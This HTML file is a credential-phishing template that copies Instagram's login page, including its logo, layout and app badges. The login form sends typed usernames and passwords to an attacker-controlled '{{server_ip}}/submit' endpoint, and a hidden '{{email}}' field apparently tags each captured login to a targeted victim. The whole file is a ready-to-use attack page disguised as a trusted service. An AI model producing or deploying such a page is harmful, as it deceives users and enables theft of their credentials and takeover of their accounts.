<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram â€¢ Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 350px;
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            text-align: center;
        }

        .logo {
            width: 175px;
            margin: 0 auto 30px;
        }

        input {
            width: 100%;
            padding: 9px 8px;
            margin: 0 0 6px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
        }

        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 7px 16px;
            border-radius: 8px;
            font-weight: 600;
            margin: 8px 0;
            cursor: pointer;
        }

        .separator {
            color: #8e8e8e;
            margin: 15px 0;
            display: flex;
            align-items: center;
        }

        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .footer {
            color: #8e8e8e;
            font-size: 12px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
        
        <form method="POST" action="{{server_ip}}/submit">
            <input type="hidden" name="email" value="{{email}}">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>

        <div class="separator">
            <div class="line"></div>
            <span>OR</span>
            <div class="line"></div>
        </div>

        <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <div class="container" style="margin-top: 10px; padding: 20px;">
        <p class="footer">Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none;">Sign up</a></p>
    </div>

    <div style="text-align: center; margin-top: 20px;">
        <p class="footer">Get the app.</p>
        <div style="margin-top: 10px;">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" style="height: 40px; margin: 0 5px;">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" style="height: 40px; margin: 0 5px;">
        </div>
    </div>
</body>
</html>
